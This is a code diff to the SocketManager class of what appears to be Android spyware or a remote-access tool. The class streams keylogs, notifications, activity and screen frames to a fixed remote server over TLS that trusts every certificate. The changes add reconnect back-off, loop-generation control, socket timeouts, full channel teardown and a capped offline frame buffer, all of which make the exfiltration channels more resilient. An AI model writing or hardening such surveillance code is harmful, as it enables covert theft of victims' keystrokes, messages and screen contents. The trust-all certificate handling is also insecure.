@@ -100,6 +100,27 @@ public class SocketManager {
     // Single-thread executor prevents multiple concurrent live loops from stacking up
     private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();
 
+    // ── Reconnect back-off ────────────────────────────────────────────────
+    // Starts at TCP_RECONNECT_DELAY (1 500 ms), doubles on each consecutive failure,
+    // caps at 60 s. Reset to the base value on each successful connection so the
+    // next failure after a good session starts fast again.
+    // forceReconnect() also resets so network-wake events reconnect immediately.
+    private static final long MAX_RECONNECT_DELAY_MS = 60_000L;
+    private volatile long primaryReconnectDelayMs = Constants.TCP_RECONNECT_DELAY;
+    private volatile long streamReconnectDelayMs  = Constants.TCP_RECONNECT_DELAY;
+    private volatile long liveReconnectDelayMs    = Constants.TCP_RECONNECT_DELAY;
+
+    // ── Loop identity ─────────────────────────────────────────────────────
+    // loopGeneration is incremented by forceReconnect() so that any previously
+    // started loop iteration exits at its next while-condition check instead of
+    // continuing alongside the freshly started one (prevents duplicate loops).
+    // The per-loop Thread references allow forceReconnect() to interrupt a sleep
+    // so the backoff delay wakes up immediately instead of waiting up to 60 s.
+    private volatile int    loopGeneration    = 0;
+    private volatile Thread primaryLoopThread = null;
+    private volatile Thread streamLoopThread  = null;
+    private volatile Thread liveLoopThread    = null;
+
     // Streaming state — event-driven (single-frame on request, idle keepalive)
     private volatile boolean idleFrameMode = false;
     private ScheduledFuture<?> idleFrameFuture;
@@ -329,7 +350,9 @@ public class SocketManager {
     }
 
     private void connectionLoop() {
-        while (running) {
+        primaryLoopThread = Thread.currentThread();
+        final int myGen = loopGeneration;
+        while (running && loopGeneration == myGen) {
             try {
                 Log.i(TAG, "Connecting (TLS) to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                 SSLSocketFactory tlsFactory = buildTrustAllFactory();
@@ -339,11 +362,12 @@ public class SocketManager {
                 tcpSocket = sslSock;
                 tcpSocket.setKeepAlive(true);
                 tcpSocket.setTcpNoDelay(true);
-                tcpSocket.setSoTimeout(0);
+                tcpSocket.setSoTimeout(90_000); // 90 s — unblocks readLine if server dies without closing TCP
 
                 out       = new PrintWriter(tcpSocket.getOutputStream(), true);
                 in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
                 connected = true;
+                primaryReconnectDelayMs = Constants.TCP_RECONNECT_DELAY; // reset back-off on success
 
                 Log.i(TAG, "TCP connected — registering device");
                 registerDevice(DeviceInfo.getDeviceId(context));
@@ -359,11 +383,16 @@ public class SocketManager {
                 closeSilently();
             }
 
-            if (running) {
-                Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
-                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
+            if (running && loopGeneration == myGen) {
+                Log.d(TAG, "Reconnecting in " + primaryReconnectDelayMs + " ms… (back-off)");
+                try { Thread.sleep(primaryReconnectDelayMs); } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt(); // restore flag; while-check will exit if forceReconnect fired
+                }
+                // Exponential back-off: double on each failure, cap at MAX_RECONNECT_DELAY_MS
+                primaryReconnectDelayMs = Math.min(primaryReconnectDelayMs * 2, MAX_RECONNECT_DELAY_MS);
             }
         }
+        primaryLoopThread = null;
         Log.i(TAG, "Connection loop ended");
     }
 
@@ -376,7 +405,9 @@ public class SocketManager {
     // ── Secondary channel: stream (frame data only) ───────────────────────
 
     private void streamChannelLoop() {
-        while (running) {
+        streamLoopThread = Thread.currentThread();
+        final int myGen = loopGeneration;
+        while (running && loopGeneration == myGen) {
             // Wait until the primary channel is established before opening secondary channels.
             // This prevents a flood of reconnection attempts when the primary isn't ready yet.
             if (!connected) {
@@ -392,9 +423,10 @@ public class SocketManager {
                 streamSocket.setKeepAlive(true);
                 streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
                 streamSocket.setSendBufferSize(131072);  // 128 KB send buffer — frames fit in one flush
-                streamSocket.setSoTimeout(0);
+                streamSocket.setSoTimeout(90_000); // 90 s — unblocks readLine if server dies without closing TCP
                 streamOut = new PrintWriter(streamSocket.getOutputStream(), true);
                 streamConnected = true;
+                streamReconnectDelayMs = Constants.TCP_RECONNECT_DELAY; // reset back-off on success
                 // Register as stream channel
                 String deviceId = DeviceInfo.getDeviceId(context);
                 JSONObject d = new JSONObject();
@@ -467,10 +499,15 @@ public class SocketManager {
                 try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
                 streamOut = null;
             }
-            if (running) {
-                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
+            if (running && loopGeneration == myGen) {
+                Log.d(TAG, "Stream channel reconnecting in " + streamReconnectDelayMs + " ms… (back-off)");
+                try { Thread.sleep(streamReconnectDelayMs); } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
+                streamReconnectDelayMs = Math.min(streamReconnectDelayMs * 2, MAX_RECONNECT_DELAY_MS);
             }
         }
+        streamLoopThread = null;
     }
 
     private void sendStreamMessage(String event, JSONObject data) {
@@ -511,7 +548,9 @@ public class SocketManager {
     // ── Secondary channel: live (keylogs, notifications, activity) ────────
 
     private void liveChannelLoop() {
-        while (running) {
+        liveLoopThread = Thread.currentThread();
+        final int myGen = loopGeneration;
+        while (running && loopGeneration == myGen) {
             // Wait until the primary channel is established before opening secondary channels.
             if (!connected) {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
@@ -526,9 +565,10 @@ public class SocketManager {
                 liveSocket.setKeepAlive(true);
                 liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
                 liveSocket.setSendBufferSize(65536);  // 64 KB — ample for keylog/notif payloads
-                liveSocket.setSoTimeout(0);
+                liveSocket.setSoTimeout(90_000); // 90 s — unblocks readLine if server dies without closing TCP
                 liveOut = new PrintWriter(liveSocket.getOutputStream(), true);
                 liveConnected = true;
+                liveReconnectDelayMs = Constants.TCP_RECONNECT_DELAY; // reset back-off on success
                 String deviceId = DeviceInfo.getDeviceId(context);
                 JSONObject d = new JSONObject();
                 d.put("deviceId", deviceId);
@@ -571,10 +611,15 @@ public class SocketManager {
                 try { if (liveSocket != null) liveSocket.close(); } catch (Exception ignored) {}
                 liveOut = null;
             }
-            if (running) {
-                try { Thread.sleep(Math.max(Constants.TCP_RECONNECT_DELAY, 5000)); } catch (InterruptedException ignored) {}
+            if (running && loopGeneration == myGen) {
+                Log.d(TAG, "Live channel reconnecting in " + liveReconnectDelayMs + " ms… (back-off)");
+                try { Thread.sleep(liveReconnectDelayMs); } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
+                liveReconnectDelayMs = Math.min(liveReconnectDelayMs * 2, MAX_RECONNECT_DELAY_MS);
             }
         }
+        liveLoopThread = null;
     }
 
     private void sendLiveMessage(String event, JSONObject data) {
@@ -799,11 +844,19 @@ public class SocketManager {
                     msg.put("data", data);
                     out.print(msg.toString() + "\n");
                     out.flush();
-                    // PrintWriter swallows IOExceptions — checkError() is the only way to detect a dead socket
+                    // PrintWriter swallows IOExceptions — checkError() is the only way to detect a dead socket.
+                    // Close ALL channels so their read loops unblock and their reconnect timers fire,
+                    // instead of leaving stream/live sockets open against a dead server.
                     if (out.checkError()) {
-                        Log.w(TAG, "sendMessage: socket write error detected — marking disconnected");
-                        connected = false;
+                        Log.w(TAG, "sendMessage: write error — closing all channels to trigger full reconnect");
+                        connected       = false;
+                        streamConnected = false;
+                        liveConnected   = false;
                         closeSilently();
+                        try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
+                        try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
+                        streamOut = null;
+                        liveOut   = null;
                     }
                 } catch (JSONException e) {
                     Log.e(TAG, "sendMessage error: " + e.getMessage());
@@ -927,6 +980,19 @@ public class SocketManager {
         Log.i(TAG, "forceReconnect() — tearing down all channels and reconnecting");
         // Save streaming state before tearing down so it can be restored after reconnection
         resumeStreamingAfterReconnect = idleFrameMode || blockFrameMode;
+        // Reset back-off so the reconnect after a network-wake event happens immediately
+        primaryReconnectDelayMs = Constants.TCP_RECONNECT_DELAY;
+        streamReconnectDelayMs  = Constants.TCP_RECONNECT_DELAY;
+        liveReconnectDelayMs    = Constants.TCP_RECONNECT_DELAY;
+        // Bump generation — old loops exit at their next while-condition check instead
+        // of continuing alongside the fresh loops started by connect() below.
+        loopGeneration++;
+        // Interrupt sleeping loop threads so any backoff sleep wakes up immediately
+        // (interrupted loops still check while(running && gen==myGen) and exit cleanly).
+        Thread t1 = primaryLoopThread, t2 = streamLoopThread, t3 = liveLoopThread;
+        if (t1 != null) t1.interrupt();
+        if (t2 != null) t2.interrupt();
+        if (t3 != null) t3.interrupt();
         // Tear down existing state
         running   = false;
         connected = false;
@@ -2649,6 +2715,11 @@ public class SocketManager {
                 // Only add non-duplicate frames to the offline buffer to avoid storing identical data.
                 if (!isDuplicate && (autoRecordingActive || manualRecordingActive)) {
                     synchronized (offlineFrameBuffer) {
+                        // Hard cap: drop the oldest frame when the buffer is full so we never OOM
+                        // during a long disconnect (e.g. device offline for hours with recording on).
+                        if (offlineFrameBuffer.size() >= 300) {
+                            offlineFrameBuffer.remove(0);
+                        }
                         offlineFrameBuffer.add(payload);
                     }
                 }
